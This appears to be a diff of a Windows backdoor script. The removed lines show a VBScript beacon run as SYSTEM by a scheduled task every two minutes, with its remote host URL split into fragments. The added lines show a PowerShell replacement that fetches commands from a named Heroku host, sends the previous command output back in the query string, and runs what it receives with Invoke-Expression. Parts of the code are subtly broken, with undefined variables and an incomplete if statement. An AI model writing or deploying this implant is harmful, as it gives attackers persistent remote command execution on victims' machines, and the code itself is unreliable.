@@ -1,20 +1,9 @@
 
-
-
-schtasks /create /sc minute /mo 2 /tn "Script" /ru system /tr C:/windows/main.vbs
-
-
-
-
-On Error Resume Next
-Set fso  = CreateObject("Scripting.FileSystemObject")
-dim text
-set text = ""
-Set file = fso.OpenTextFile("C:\windows\output.txt", 1)
-text = file.ReadAll
-file.Close
-Set xml = CreateObject("MSXML2.XMLHTTP")
-x.open "GET", "htt" & "p:/" & "/bcts" & "lab2" & ".he" & "ro" & "ku.c" & "om/x?x="&text, True
-xml.send
-set sh = CreateObject("Wscript.Shell")
-sh.Run("cmd /c " & o.responseText & " > C:\windows\output.txt", 0, true)
+$fpath = "C:\windows\output.txt"
+$text = "start"
+if(Test-Path $fpath)
+$text = Get-Content $fpath | Out-String
+$data = (New-Object System.Net.WebClient).DownloadString("http://bctslab2.heroku.com/x?x="+$text)
+$data3 = "cmd /c " + $data2 + $data + $data2 
+$data4 = Invoke-Expression $data3
+Out-File -FilePath $fpath -InputObject $data4
